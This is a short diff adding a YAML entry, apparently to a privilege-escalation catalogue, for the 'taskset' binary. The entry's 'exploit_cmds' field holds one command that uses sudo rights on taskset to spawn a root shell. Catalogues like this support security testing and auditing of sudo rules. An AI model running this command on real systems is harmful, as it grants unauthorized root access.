@@ -1,0 +1,4 @@
+name: taskset
+binary_path: /usr/bin/taskset
+exploit_cmds:
+- sudo /usr/bin/taskset 1 /bin/sh
